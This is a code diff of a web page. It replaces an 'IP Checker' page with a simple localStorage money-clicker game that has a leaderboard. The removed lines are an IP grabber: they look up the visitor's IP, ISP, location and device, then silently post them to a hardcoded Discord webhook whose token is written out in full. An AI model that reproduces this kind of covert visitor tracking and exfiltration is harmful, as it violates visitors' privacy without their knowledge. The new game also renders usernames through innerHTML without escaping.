@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Checker</title>
+    <title>Simple Economic Game</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Loading Screen Styles */
+        /* Basic styling for loading screen and game elements */
         #loading-screen {
             position: fixed;
             top: 0;
@@ -34,6 +34,10 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        #game-container {
+            display: none;
+        }
     </style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center h-screen overflow-hidden">
@@ -43,92 +47,111 @@
         <div class="loader"></div>
     </div>
 
-    <!-- Main Content -->
-    <div id="main-content" class="hidden bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
-        <h1 class="text-2xl font-bold mb-4">Check Your IP</h1>
-        <div id="ip-info" class="mb-4"></div>
+    <!-- Username Form -->
+    <div id="username-form" class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
+        <h1 class="text-2xl font-bold mb-4">Enter Username</h1>
+        <input id="username" type="text" placeholder="Enter your username" class="border border-gray-300 p-2 rounded-lg w-full mb-4">
+        <button onclick="setUsername()" class="bg-blue-500 text-white p-2 rounded-lg w-full">Submit</button>
+        <p id="username-error" class="text-red-500 mt-2"></p>
+    </div>
+
+    <!-- Game Container -->
+    <div id="game-container" class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
+        <h1 class="text-2xl font-bold mb-4">Economic Game</h1>
+        <p id="money" class="text-xl mb-4">Money: $0</p>
+        <button onclick="earnMoney()" class="bg-green-500 text-white p-2 rounded-lg w-full mb-4">Earn Money</button>
+        <h2 class="text-xl font-semibold mb-2">Leaderboard</h2>
+        <ul id="leaderboard" class="list-disc pl-5">
+            <!-- Leaderboard will be updated here -->
+        </ul>
     </div>
 
     <script>
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            let deviceType = "Unknown";
-            let os = "Unknown";
+        const USERNAME_KEY = 'username';
+        const LEADERBOARD_KEY = 'leaderboard';
 
-            if (userAgent.includes("Mobile")) {
-                deviceType = "Mobile";
-            } else if (userAgent.includes("Tablet")) {
-                deviceType = "Tablet";
-            } else if (userAgent.includes("Win")) {
-                deviceType = "Desktop";
-                os = "Windows";
-            } else if (userAgent.includes("Mac")) {
-                deviceType = "Desktop";
-                os = "MacOS";
-            } else if (userAgent.includes("Linux")) {
-                deviceType = "Desktop";
-                os = "Linux";
+        function setUsername() {
+            const usernameInput = document.getElementById('username');
+            const username = usernameInput.value.trim();
+            const errorElement = document.getElementById('username-error');
+
+            if (!username) {
+                errorElement.textContent = 'Username cannot be empty';
+                return;
             }
 
-            return { deviceType, os };
+            let leaderboard = JSON.parse(localStorage.getItem(LEADERBOARD_KEY)) || [];
+
+            if (localStorage.getItem(USERNAME_KEY)) {
+                errorElement.textContent = 'Username already set';
+                return;
+            }
+
+            if (leaderboard.some(entry => entry.username === username)) {
+                errorElement.textContent = 'Username already taken';
+                return;
+            }
+
+            localStorage.setItem(USERNAME_KEY, username);
+            localStorage.setItem('money', 0); // Initialize money
+
+            document.getElementById('username-form').style.display = 'none';
+            document.getElementById('game-container').style.display = 'block';
+
+            // Start leaderboard update
+            setInterval(updateLeaderboard, 30000);
+            updateLeaderboard();
         }
 
-        async function getIPData() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                
-                const { ip, org, city, region, country_name } = data;
-                const location = `${city}, ${region}, ${country_name}`;
-                const isp = org || "Unknown ISP";
+        function earnMoney() {
+            let money = parseInt(localStorage.getItem('money'), 10) || 0;
+            money += 10; // Increase money by 10
+            localStorage.setItem('money', money);
+            document.getElementById('money').textContent = `Money: $${money}`;
+        }
 
-                const { deviceType, os } = getDeviceInfo();
+        function updateLeaderboard() {
+            const leaderboard = JSON.parse(localStorage.getItem(LEADERBOARD_KEY)) || [];
+            const username = localStorage.getItem(USERNAME_KEY);
+            const money = parseInt(localStorage.getItem('money'), 10) || 0;
 
-                document.getElementById('ip-info').innerHTML = `
-                    <p class="text-lg font-semibold mb-2"><strong>IP:</strong> ${ip}</p>
-                    <p class="text-lg font-semibold mb-2"><strong>ISP:</strong> ${isp}</p>
-                    <p class="text-lg font-semibold mb-2"><strong>Location:</strong> ${location}</p>
-                    <p class="text-lg font-semibold mb-2"><strong>Device Type:</strong> ${deviceType}</p>
-                    <p class="text-lg font-semibold mb-2"><strong>Operating System:</strong> ${os}</p>
-                `;
+            // Update current user's money
+            const existingEntry = leaderboard.find(entry => entry.username === username);
+            if (existingEntry) {
+                existingEntry.money = money;
+            } else {
+                leaderboard.push({ username, money });
+            }
 
-                sendToDiscord(ip, isp, location, deviceType, os);
-            } catch (error) {
-                // Handle errors silently or show a user-friendly message if desired
-            } finally {
-                // Hide loading screen and show main content
-                document.getElementById('loading-screen').style.opacity = '0';
+            // Sort leaderboard by money in descending order
+            leaderboard.sort((a, b) => b.money - a.money);
+            localStorage.setItem(LEADERBOARD_KEY, JSON.stringify(leaderboard));
+
+            // Render leaderboard
+            const leaderboardElement = document.getElementById('leaderboard');
+            leaderboardElement.innerHTML = leaderboard.map(entry =>
+                `<li>${entry.username}: $${entry.money}</li>`
+            ).join('');
+        }
+
+        function checkForExistingUsername() {
+            const username = localStorage.getItem(USERNAME_KEY);
+            if (username) {
+                document.getElementById('username-form').style.display = 'none';
+                document.getElementById('game-container').style.display = 'block';
+                updateLeaderboard(); // Ensure leaderboard is updated
+            } else {
+                document.getElementById('loading-screen').style.display = 'flex';
                 setTimeout(() => {
-                    document.getElementById('loading-screen').style.display = 'none';
-                    document.getElementById('main-content').classList.remove('hidden');
-                }, 500); // Matches the transition time
+                    document.getElementById('loading-screen').style.opacity = '0';
+                    setTimeout(() => {
+                        document.getElementById('loading-screen').style.display = 'none';
+                    }, 500); // Match transition time
+                }, 1000); // Adjust to match your loading screen duration
             }
         }
 
-        async function sendToDiscord(ip, isp, location, deviceType, os) {
-            const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}\nDevice Type: ${deviceType}\nOperating System: ${os}`;
-            const discordWebhookUrl = 'https://discord.com/api/webhooks/1247107833435258911/807oJEH8MIMSq9OS-MxFssEplKJiy-UVQb1hmtcy3DnYI_azgx5VVsRu2LWrW4nW8688';
-
-            const payload = {
-                content: message
-            };
-
-            try {
-                await fetch(discordWebhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-            } catch (error) {
-                // Handle errors silently or show a user-friendly message if desired
-            }
-        }
-
-        // Show loading screen initially and start fetching IP data
-        document.getElementById('loading-screen').style.display = 'flex';
-        getIPData();
+        checkForExistingUsername();
     </script>
 </body>
 </html>
